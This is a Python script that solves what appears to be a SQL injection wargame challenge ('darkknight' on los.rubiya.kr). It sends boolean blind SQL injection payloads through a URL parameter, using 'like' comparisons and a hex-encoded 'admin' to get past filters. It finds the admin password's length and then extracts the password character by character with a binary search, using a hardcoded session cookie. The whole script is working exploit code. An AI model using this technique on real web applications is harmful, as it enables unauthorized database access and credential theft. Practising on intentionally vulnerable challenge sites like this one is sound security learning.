import requests

host = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies = { 'PHPSESSID' : '6mbqmketb6r09p3gn7os3b7alh' }

pw_length = 0

while True:
    pw_length += 1

    query = f"0 or id like 0x61646d696e and length(pw) like {pw_length}-- -"
    url = f"{host}?no={query}"

    r = requests.get(url, cookies = cookies)

    if "Hello admin" in r.text:
        print(f"password length: {pw_length}")
        break

password = ''

for i in range(1, pw_length + 1):
    high = 127
    low = 32
    char = ''

    while low <= high:
        mid = (low+high)//2
        query = f"0 or id like 0x61646d696e and ord(mid(pw, {i}, 1)) > {mid}-- -"
        url = f"{host}?no={query}"

        r = requests.get(url, cookies = cookies)

        if "Hello admin" in r.text:
            low = mid + 1
        else:
            high = mid - 1
            char = chr(mid)

    password += char
    print(f"현재까지 찾은 비밀번호: {password}")

print(f"최종 비밀번호: {password}")